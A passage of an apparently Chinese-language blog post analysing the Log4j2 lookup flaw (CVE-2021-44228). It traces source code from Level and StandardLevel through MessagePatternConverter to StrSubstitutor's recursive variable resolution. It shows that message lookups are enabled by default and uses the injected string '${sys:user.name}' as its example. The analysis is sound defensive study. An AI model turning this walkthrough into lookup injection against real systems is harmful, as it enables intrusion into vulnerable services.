<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.logging.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.spi.StandardLevel;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.util.Strings;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Levels used for identifying the severity of an event. Levels are organized from most specific to least:</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #OFF&#125; (most specific, no logging)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #FATAL&#125; (most specific, little data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #ERROR&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #WARN&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #INFO&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #DEBUG&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #TRACE&#125; (least specific, a lot of data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #ALL&#125; (least specific, all data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Typically, configuring a level in a filter or on a logger will cause logging events of that level and those that are</span></span><br><span class="line"><span class="comment"> * more specific to pass through the filter. A special level, &#123;<span class="doctag">@link</span> #ALL&#125;, is guaranteed to capture all levels when</span></span><br><span class="line"><span class="comment"> * used in logging configurations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Level</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Level&gt;, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No events will be logged.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level OFF;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A severe error that will prevent the application from continuing.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level FATAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An error in the application, possibly recoverable.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event that might possible lead to an error.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level WARN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event for informational purposes.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level INFO;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A general debugging event.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level DEBUG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level TRACE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All events should be logged.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level ALL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @since 2.1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CATEGORY</span> <span class="operator">=</span> <span class="string">&quot;Level&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ConcurrentMap&lt;String, Level&gt; LEVELS = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(); <span class="comment">// SUPPRESS CHECKSTYLE</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1581082L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        OFF = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;OFF&quot;</span>, StandardLevel.OFF.intLevel());</span><br><span class="line">        FATAL = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;FATAL&quot;</span>, StandardLevel.FATAL.intLevel());</span><br><span class="line">        ERROR = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;ERROR&quot;</span>, StandardLevel.ERROR.intLevel());</span><br><span class="line">        WARN = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;WARN&quot;</span>, StandardLevel.WARN.intLevel());</span><br><span class="line">        INFO = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;INFO&quot;</span>, StandardLevel.INFO.intLevel());</span><br><span class="line">        DEBUG = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;DEBUG&quot;</span>, StandardLevel.DEBUG.intLevel());</span><br><span class="line">        TRACE = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;TRACE&quot;</span>, StandardLevel.TRACE.intLevel());</span><br><span class="line">        ALL = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;ALL&quot;</span>, StandardLevel.ALL.intLevel());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> intLevel;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StandardLevel standardLevel;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Level</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> <span class="type">int</span> intLevel)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Strings.isEmpty(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal null or empty Level name.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (intLevel &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Level int less than zero.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.intLevel = intLevel;</span><br><span class="line">        <span class="built_in">this</span>.standardLevel = StandardLevel.getStandardLevel(intLevel);</span><br><span class="line">        <span class="keyword">if</span> (LEVELS.putIfAbsent(name, <span class="built_in">this</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Level &quot;</span> + name + <span class="string">&quot; has already been defined.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the integral value of this Level.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value of this Level.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">intLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.intLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the standard Level values as an enum.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> an enum of the standard Levels.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> StandardLevel <span class="title function_">getStandardLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> standardLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>StandardLevel.ERROR.intLevel()方法则是获取ERROR的等级数，即200，而StandardLevel是一个枚举类，在其中记录了不同级别的日志记录，OFF&gt;FATAL&gt;ERROR&gt;WARN&gt;INFO&gt;DEBUG&gt;TRACE&gt;ALL。根据实际测试，在默认情况下，只会将ERROR和FATAL等级的日志输出至控制台。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.logging.log4j.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard Logging Levels as an enumeration for use internally. This enum is used as a parameter in any public APIs.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StandardLevel</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No events will be logged.</span></span><br><span class="line">    OFF(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A severe error that will prevent the application from continuing.</span></span><br><span class="line">    FATAL(<span class="number">100</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An error in the application, possibly recoverable.</span></span><br><span class="line">    ERROR(<span class="number">200</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event that might possible lead to an error.</span></span><br><span class="line">    WARN(<span class="number">300</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event for informational purposes.</span></span><br><span class="line">    INFO(<span class="number">400</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A general debugging event.</span></span><br><span class="line">    DEBUG(<span class="number">500</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line">    TRACE(<span class="number">600</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All events should be logged.</span></span><br><span class="line">    ALL(Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> EnumSet&lt;StandardLevel&gt; LEVELSET = EnumSet.allOf(StandardLevel.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> intLevel;</span><br><span class="line"></span><br><span class="line">    StandardLevel(<span class="keyword">final</span> <span class="type">int</span> val) &#123;</span><br><span class="line">        intLevel = val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the integer value of the Level.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the integer value of the Level.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">intLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> intLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Method to convert custom Levels into a StandardLevel for conversion to other systems.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> intLevel The integer value of the Level.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The StandardLevel.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> StandardLevel <span class="title function_">getStandardLevel</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> intLevel)</span> &#123;</span><br><span class="line">        <span class="type">StandardLevel</span> <span class="variable">level</span> <span class="operator">=</span> StandardLevel.OFF;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> StandardLevel lvl : LEVELSET) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lvl.intLevel() &gt; intLevel) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            level = lvl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，如上值继续进入logIfEnabled方法中，见下图所示。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/2.png"></p>
<p>通过isEnabled方法的判断后，到达logMessage方法中，在其中调用了logMessageSafely方法。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/3.png"></p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/4.png"></p>
<p>logMessageSafely方法中调用到了logMessageTrackRecursion方法，其中又调用了tryLogMessage方法，tryLogMessage中调用了log方法。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/5.png"></p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/6.png"></p>
<p>……</p>
<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>省略中间的一些非关键调用，直到断点到达org.apache.logging.log4j.core.pattern.PatternFormatter#format方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (skipFormattingInfo) &#123;</span><br><span class="line">        converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/7.png"></p>
<p>从此处开始跟进，进入到org.apache.logging.log4j.core.pattern.MessagePatternConverter#format方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Formats an event into a string buffer.</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个方法中会对config与noLookups进行判断，noLookups在MessagePatternConverter类被实例化时会被赋值，即在默认情况下，值为false，也就意味着默认情况下允许查询。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Private constructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> options</span></span><br><span class="line"><span class="comment"> *            options, may be null.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">MessagePatternConverter</span><span class="params">(<span class="keyword">final</span> Configuration config, <span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="string">&quot;Message&quot;</span>, <span class="string">&quot;message&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.formats = options;</span><br><span class="line">    <span class="built_in">this</span>.config = config;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">noLookupsIdx</span> <span class="operator">=</span> loadNoLookups(options);</span><br><span class="line">    <span class="built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.textRenderer = loadMessageRenderer(noLookupsIdx &gt;= <span class="number">0</span> ? ArrayUtils.remove(options, noLookupsIdx) : options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LOG4J2-2109 if &#123;<span class="doctag">@code</span> true&#125;, MessagePatternConverter will always operate as though</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;%m&#123;nolookups&#125;&lt;/pre&gt; is configured.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(</span><br><span class="line">        <span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>这样便会进入到if分支，获取${}及其中的内容，也就是${sys:user.name}。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/8.png"></p>
<p>然后调用到workingBuilder.append(config.getStrSubstitutor().replace(event, value))。</p>
<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>即进入到StrSubstitutor#replace()方法中。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/9.png"></p>
<p>这个方法所属的类StrSubstitutor是Log4j2中用于字符替换的核心类。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/10.png"></p>
<p>继续往下跟进，到达StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)方法。</p>
<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/11.png"></p>
<p>这个方法中，会通过一个while循环来逐字符会寻找变量前缀${，当找到后会继续寻找后缀}，并会处理嵌套变量。</p>
<p>然后进行变量解析，此处会调用resolveVariable方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// resolve the variable</span></span><br><span class="line"><span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> resolveVariable(event, varName, buf, startPos, endPos);</span><br><span class="line"><span class="keyword">if</span> (varValue == <span class="literal">null</span>) &#123;</span><br><span class="line">    varValue = varDefaultValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (varValue != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// recursive replace</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">varLen</span> <span class="operator">=</span> varValue.length();</span><br><span class="line">    buf.replace(startPos, endPos, varValue);</span><br><span class="line">    altered = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">change</span> <span class="operator">=</span> substitute(event, buf, startPos, varLen, priorVariables);</span><br><span class="line">    change = change + (varLen - (endPos - startPos));</span><br><span class="line">    pos += change;</span><br><span class="line">    bufEnd += change;</span><br><span class="line">    lengthChange += change;</span><br><span class="line">    chars = getChars(buf); <span class="comment">// in case buffer was altered</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

